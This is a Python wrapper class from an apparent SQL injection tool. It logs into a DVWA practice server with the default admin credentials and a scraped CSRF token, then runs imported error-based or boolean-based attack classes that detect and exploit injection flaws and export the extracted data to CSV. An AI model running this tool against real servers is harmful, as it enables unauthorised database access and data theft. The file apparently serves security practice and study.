import re
import requests
from urllib.parse import urlsplit, urlunsplit, SplitResult

from attacks import ErrorBasedAttack, BooleanBasedAttack
from utilities import Injection

# Supported injection types with their corresponding classes.
INJECTION_CLASSES = {
    Injection.ERROR_BASED: ErrorBasedAttack,
    Injection.BOOLEAN_BASED: BooleanBasedAttack
}


class SQLInjection:
    """
    SQLInjection class is the wrapper class that performs different injection attempts, based on the user's arguments.
    It uses the different Attack classes to achieve both detection and exploitation of vulnerabilities.
    """

    def __init__(self, injection_type: Injection, url: str, login_dvwa: bool = True, manual: bool = False, export_path: str = None) -> None:
        """
        SQLInjection constructor. Builds the object according to the provided parameters.
        @param injection_type: The injection type, out of Injection enum options.
        @param url: The URL of the server, with parameters.
        @param login_dvwa: True if the provided URL is of a DVWA server.
        @param manual: True to allow user-input queries, instead of the automatic mechanism.
        @param export_path: Path to CSV file to save the data, if provided.
        @return: None.
        """

        # Initialize HTTP session.
        self.session = requests.Session()

        # Initialize needed fields.
        self._data = None
        self._used_payload = None

        self._url = url
        self._injection_class = INJECTION_CLASSES[injection_type]
        self._manual = manual
        self._export_path = export_path

        # Support logging into DVWA server.
        if login_dvwa:
            split_url = urlsplit(url)
            login_url = urlunsplit(SplitResult(split_url.scheme, split_url.netloc, "/login.php", "", ""))  # NOQA
            login_payload = {"username": "admin", "password": "password", "Login": "Login"}

            response = self.session.get(login_url)
            token = re.search("user_token'\s*value='(.*?)'", response.text).group(1)  # NOQA
            login_payload['user_token'] = token

            self.session.post(login_url, data=login_payload)

    def attack(self) -> None:
        """
        Main attack method. Uses the appropriate injection class to perform an attack, and saves the result.
        @return: None.
        """

        # Initialize the correct attacker object.
        attacker = self._injection_class(self.session, self._url, self._manual)

        # Detects vulnerabilities for provided injection class, exploits them, and returns the results.
        self._data, self._used_payload = attacker.attack()

        if self._export_path:
            self._data.to_csv(self._export_path)

    def __str__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        representation = "No data has been found."
        if self._used_payload is not None or self._data is not None:
            representation = str(self._used_payload) + '\n' + str(self._data)

        return representation

    def __repr__(self) -> str:
        """
        String representation of SQLInjection object.
        @return: String representation.
        """

        representation = "No data has been found."
        if self._used_payload is not None or self._data is not None:
            representation = str(self._used_payload) + '\n' + str(self._data)

        return representation
